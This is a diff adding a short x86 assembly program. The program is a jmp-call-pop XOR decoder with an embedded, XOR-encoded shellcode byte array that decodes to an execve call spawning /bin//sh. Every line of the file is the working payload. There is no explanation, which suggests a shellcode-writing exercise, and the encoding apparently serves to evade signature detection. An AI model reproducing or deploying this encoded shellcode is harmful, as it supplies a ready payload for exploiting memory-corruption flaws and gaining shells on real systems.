@@ -1,0 +1,26 @@
+global _start
+section .text
+
+_start:
+
+	jmp short call_shellcode
+
+decoder:
+	pop esi
+	xor eax,eax
+	xor ecx,ecx
+	xor ebx,ebx
+
+decode:
+	mov bl,byte[esi]
+	xor bl,0xbb
+	jz short encoded_shellcode
+	mov bl, byte[esi]
+	xor bl, 0xaa
+	mov byte [esi], bl
+	inc esi
+	jmp short decode
+
+call_shellcode:
+	call decoder
+	encoded_shellcode: db 0x9b,0x6a,0xfa,0xc2,0x85,0x85,0xd9,0xc2,0xc2,0x85,0xc8,0xc3,0xc4,0x2d,0x49,0x1a,0xa1,0x67,0x2a,0xbb
